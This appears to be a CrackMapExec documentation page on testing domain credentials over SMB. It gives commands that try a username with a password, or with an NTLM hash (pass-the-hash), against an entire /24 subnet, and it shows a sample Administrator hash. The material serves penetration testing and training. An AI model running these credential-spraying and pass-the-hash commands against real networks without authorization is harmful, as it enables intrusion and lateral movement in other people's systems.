# Checking Domain Credentials

## Authentication

* Failed logins result in a \[-]
* Successful logins result in a \[+] Domain\Username:Password

Local admin access results in a (Pwn3d!) added after the login confirmation, shown below.

```
    SMB         192.168.1.101    445    HOSTNAME          [+] DOMAIN\Username:Password (Pwn3d!)
```

The following checks will attempt authentication to the entire /24 though a single target may also be used.

### User/Password

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE'
```

### User/Hash

After obtaining credentials such as\
Administrator:500:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::\
you can use both the full hash or just the nt hash (second half)

```
#~ cme smb 192.168.1.0/24 -u UserNAme -H 'LM:NT'
#~ cme smb 192.168.1.0/24 -u UserNAme -H 'NTHASH'
#~ cme smb 192.168.1.0/24 -u Administrator -H '13b29964cc2480b4ef454c59562e675c'
#~ cme smb 192.168.1.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c595
```
